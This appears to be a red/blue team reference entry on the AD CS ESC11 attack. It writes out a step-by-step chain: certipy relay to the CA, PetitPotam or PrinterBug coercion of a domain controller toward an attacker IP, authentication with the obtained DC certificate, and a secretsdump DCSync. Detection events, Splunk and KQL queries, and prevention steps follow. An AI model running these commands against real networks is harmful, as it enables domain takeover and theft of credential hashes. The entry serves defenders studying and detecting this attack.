name: ADCS ESC11 - NTLM Relay to CA via ICertPassage RPC
description: ESC11 abuses the ICertPassage RPC interface on the CA, which lacks Extended Protection for Authentication (EPA). Coerce NTLM auth from a machine (PetitPotam/PrinterBug) and relay it to the CA's RPC endpoint to request a certificate as that machine account. No web enrollment needed.
notes:
=== THE IDEA ===
The CA's ICertPassage RPC interface does not enforce EPA by default.
Coerce NTLM auth from a DC (PetitPotam/PrinterBug) and relay it
directly to the CA via RPC - no web enrollment (ESC8) needed.

=== ATTACK CHAIN ===
  # Terminal 1: Start certipy relay listening on the CA
  certipy relay -ca ca01.corp.local

  # Terminal 2: Coerce DC authentication
  python3 PetitPotam.py <attacker_ip> <dc_ip>
  # or: python3 printerbug.py corp.local/user:pass@<dc_ip> <attacker_ip>

  # certipy will catch the relay and request a cert as DC$
  # Output: dc01.pfx

  # Step 3: Authenticate with the DC certificate
  certipy auth -pfx dc01.pfx -dc-ip <dc_ip>

  # Step 4: DCSync with the NT hash
  secretsdump.py -hashes :<nt_hash> corp.local/dc01$@<dc_ip>

=== DIFFERENCE FROM ESC8 ===
- ESC8 targets the web enrollment HTTP endpoint (certsrv)
- ESC11 targets the RPC interface (ICertPassage)
- ESC11 works even if web enrollment is disabled
- Both require NTLM relay (no EPA enforcement)

=== REQUIREMENTS ===
- CA without EPA on ICertPassage RPC interface
- NTLM coercion method (PetitPotam, PrinterBug, ShadowCoerce)
- Machine template allowing enrollment

recommended.note: PetitPotam provides the NTLM coercion needed for ESC11.
ESC4 is a template-based attack; ESC11 is relay-based.

defense.why_it_works: The ICertPassage RPC interface on the CA accepts NTLM authentication without Extended Protection for Authentication (EPA), allowing relayed credentials to request certificates.
defense.prerequisites: CA without EPA on RPC interface; NTLM coercion method; machine template.
defense.impact: Certificate as any machine account whose NTLM auth is coerced - typically the DC, leading to DCSync.
defense.detection: [MITRE T1649] NTLM authentication to CA from unexpected sources; certificate requests for machine accounts not originating from those machines.
defense.artifacts: Event 4768/4769 (Kerberos ticket requests with certificate); NTLM relay traffic to CA; Event 4886/4887.
defense.splunk_spl:
index=wineventlog EventCode=4887 TemplateName="Machine"
| where RequesterName!=dns_hostname
| table _time, RequesterName, SubjectName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4887
| where CertificateTemplate == "Machine"
| project TimeGenerated, RequesterName, SubjectName
defense.prevention: Enable EPA on the CA's RPC interface; enforce LDAP signing; restrict NTLM authentication via GPO.

detections.name: ESC11 - Machine certificate request via RPC relay
detections.logic:
SecurityEvent
| where EventID == 4887
| where CertificateTemplate contains "Machine"
| project TimeGenerated, RequesterName, SubjectName, CertificateTemplate
detections.false_positives: Auto-enrollment of machine certificates by legitimate systems
detections.tuning: Compare requester source IP with the machine account's known IP
